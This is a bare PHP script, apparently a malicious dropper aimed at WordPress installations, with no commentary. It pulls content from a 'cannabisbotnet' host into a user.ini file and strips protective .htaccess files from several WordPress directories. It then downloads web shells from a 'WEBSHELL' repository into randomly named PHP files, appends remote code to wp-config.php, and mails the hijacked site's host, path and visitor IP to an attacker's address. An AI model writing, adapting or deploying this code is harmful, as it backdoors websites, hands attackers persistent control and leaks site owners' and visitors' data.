<?php

function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/user.ini" ;
$text = http_get('https://cannabisbotnet.000webhostapp.com/ghost/FAPCkjY.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo "Done Reset ===>  ".$check."</br>";
}else{ 
echo "Fail Reset" ;
}
$check212 = $_SERVER['DOCUMENT_ROOT'] . "/.htaccess" ;
$msi = "0777";
$perms = 0;
				for($i=strlen($msi)-1;$i>=0;--$i)
					$perms += (int)$msi[$i]*pow(8, (strlen($msi)-$i-1));
				if(!@chmod($check212, $perms)){
				echo "Fail Set chmod ===>  ".$check212."?up|".$msi."</br>";	
			}
			else{
echo "Done Set chmod ===>  ".$check212."?up|".$msi."</br>";

@unlink(".htaccess");
if(!file_exists($check212)){
    echo "Done Reset ===>  ".$check212."?up</br>";
    $msis = "0444";
$perms = 0;
				for($i=strlen($msis)-1;$i>=0;--$i)
					$perms += (int)$msis[$i]*pow(8, (strlen($msis)-$i-1));
				if(!@chmod($check212, $perms)){
					
				echo "Fail Reset chmod ===>  ".$check212."?up|".$msis."</br>";
				
			}
			else{
				echo "Done Reset chmod ===>  ".$check212."?up|".$msis."</br>";
			}
}else {

echo "Fail Reset" ;
}
}
$check2122 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/.htaccess" ;
$msi = "0777";
$perms = 0;
				for($i=strlen($msi)-1;$i>=0;--$i)
					$perms += (int)$msi[$i]*pow(8, (strlen($msi)-$i-1));
				if(!@chmod($check2122, $perms)){
				echo "Fail Set chmod ===>  ".$check2122."?up|".$msi."</br>";	
			}
			else{
echo "Done Set chmod ===>  ".$check2122."?up|".$msi."</br>";

@unlink($check2122);
if(!file_exists($check2122)){
    echo "Done Reset ===>  ".$check2122."?up</br>";
    $msis = "0444";
$perms = 0;
				for($i=strlen($msis)-1;$i>=0;--$i)
					$perms += (int)$msis[$i]*pow(8, (strlen($msis)-$i-1));
				if(!@chmod($check2122, $perms)){
					
				echo "Fail Reset chmod ===>  ".$check2122."?up|".$msis."</br>";
				
			}
			else{
				echo "Done Reset chmod ===>  ".$check2122."?up|".$msis."</br>";
			}
}else {

echo "Fail Reset" ;
}
}
$check2123 = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/.htaccess" ;
$msi = "0777";
$perms = 0;
				for($i=strlen($msi)-1;$i>=0;--$i)
					$perms += (int)$msi[$i]*pow(8, (strlen($msi)-$i-1));
				if(!@chmod($check2123, $perms)){
				echo "Fail Set chmod ===>  ".$check2123."?up|".$msi."</br>";	
			}
			else{
echo "Done Set chmod ===>  ".$check2123."?up|".$msi."</br>";

@unlink($check2123);
if(!file_exists($check2123)){
    echo "Done Reset ===>  ".$check2123."?up</br>";
    $msis = "0444";
$perms = 0;
				for($i=strlen($msis)-1;$i>=0;--$i)
					$perms += (int)$msis[$i]*pow(8, (strlen($msis)-$i-1));
				if(!@chmod($check2123, $perms)){
					
				echo "Fail Reset chmod ===>  ".$check2123."?up|".$msis."</br>";
				
			}
			else{
				echo "Done Reset chmod ===>  ".$check2123."?up|".$msis."</br>";
			}
}else {

echo "Fail Reset" ;
}

}
$check2124 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/.htaccess" ;
$msi = "0777";
$perms = 0;
				for($i=strlen($msi)-1;$i>=0;--$i)
					$perms += (int)$msi[$i]*pow(8, (strlen($msi)-$i-1));
				if(!@chmod($check2124, $perms)){
				echo "Fail Set chmod ===>  ".$check2124."?up|".$msi."</br>";	
			}
			else{
echo "Done Set chmod ===>  ".$check2124."?up|".$msi."</br>";

@unlink($check2124);
if(!file_exists($check2124)){
    echo "Done Reset ===>  ".$check2124."?up</br>";
    $msis = "0444";
$perms = 0;
				for($i=strlen($msis)-1;$i>=0;--$i)
					$perms += (int)$msis[$i]*pow(8, (strlen($msis)-$i-1));
				if(!@chmod($check2124, $perms)){
					
				echo "Fail Reset chmod ===>  ".$check2124."?up|".$msis."</br>";
				
			}
			else{
				echo "Done Reset chmod ===>  ".$check2124."?up|".$msis."</br>";
			}
}else {

echo "Fail Reset" ;
}


			}

$ip = getenv("REMOTE_ADDR");
$subj98 = " Ghazascanner_2019runbot V2  | $ra44";
$email = "sitexploit@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$b75$a45  $m22";
mail($email, $subj98, $msg8873, $from);




$ra44 = rand(1, 99999);

$ra44x = rand(1, 99999);


$chec4k = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/".$ra44.".php" ;
$text = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/v.php');
$open = fopen($chec4k, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo "Done Reset ===>  ".$chec4k."</br>";
}else 
echo "Fail Reset" ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/".$ra44x.".php" ;
$text2 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/pm.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo "Done Reset ===>  ".$check2."</br>";
}else 
echo "Fail Reset" ;
$check21 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/".$ra44.".php" ;
$text21 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/mar.php');
$open21 = fopen($check21, 'w');
fwrite($open21, $text21);
fclose($open21);
if(file_exists($check21)){
    echo "Done Reset ===>  ".$check21."</br>";
}else 
echo "Fail Reset" ;
$check28 = "./".$ra44.".php" ;
$text28 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/pm.php');
$open28 = fopen($check28, 'w');
fwrite($open28, $text28);
fclose($open28);
if(file_exists($check28)){
    echo "Done Reset ===>  ".$check28."</br>";
}else 
echo "Fail Reset" ;

$check212 = $_SERVER['DOCUMENT_ROOT'] . "/wp-config.php" ;
$text212 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/wp-config.php');
$open212 = fopen($check212, 'a');
fwrite($open212, $text212);
fclose($open212);
if(file_exists($check212)){
    echo "Done Reset ===>  ".$check212."?up</br>";
}else {

echo "Fail Reset" ;
}





$ip = getenv("REMOTE_ADDR");
$subj98 = " Ghazascanner_2019runbot V2  | $ra44";
$email = "sitexploit@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$b75$a45  $m22";
mail($email, $subj98, $msg8873, $from);

?>
